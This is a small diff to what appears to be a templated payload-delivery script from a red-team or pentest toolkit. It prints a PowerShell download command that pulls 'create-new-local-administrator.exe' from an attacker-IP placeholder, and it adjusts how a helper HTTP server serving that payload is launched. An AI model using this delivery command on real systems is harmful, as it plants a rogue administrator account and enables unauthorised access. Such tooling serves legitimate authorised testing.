@@ -11,4 +11,4 @@ content: |
   echo '                      -----PowerShell-----                      '; \
   echo 'Deliver only (x64): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/create-new-local-administrator.exe -Outfile {{ delivery_path_windows }}\create-new-local-administrator.exe'; \
   echo '================================================================'; \
-python -m {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
